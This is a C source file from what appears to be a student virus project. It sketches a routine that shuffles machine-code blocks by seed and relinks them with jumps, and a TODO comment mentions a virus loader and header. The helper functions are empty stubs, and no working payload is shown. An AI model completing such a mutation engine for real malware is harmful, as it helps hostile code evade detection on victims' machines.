/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   permutate_blocks.c                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/03/01 17:19:22 by ichkamo           #+#    #+#             */
/*   Updated: 2020/03/01 19:49:02 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "blocks.h"
#include "errors.h"

/*
** permutate_blocks
** - permutates the code given by instructions blocks of arbitrary size
** - the blocks are permutated deterministically according to the seed
** - when needed the blocks are linked together with jumps
** - when possible jumps are eliminated by using them as separator when
**   splitting blocks
**
*/

static bool	shard_block(struct block_allocation *block_memory, \
			struct code_block *blocks[MAX_BLOCKS])
{
	return true;
}

static bool	shuffle_blocks(struct code_block *blocks[MAX_BLOCKS], uint64_t seed)
{
	return true;
}

static bool	apply_shift_blocks(void *code, size_t size, \
			struct code_block *blocks[MAX_BLOCKS])
{
	return true;
}

// TODO change virus call in loader!!!!!!!!!!!!
// by adding rel virus entry to virus_header
bool		permutate_blocks(void *code, uint64_t seed, size_t size)
{
	struct block_allocation		block_memory;
	struct code_block		*blocks[MAX_BLOCKS];

	if (!disasm_block(&block_memory, code, size)
	|| !shard_block(&block_memory, blocks)
	|| !shuffle_blocks(blocks, seed)
	|| !apply_shift_blocks(code, size, blocks))
		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);

	return true;
}
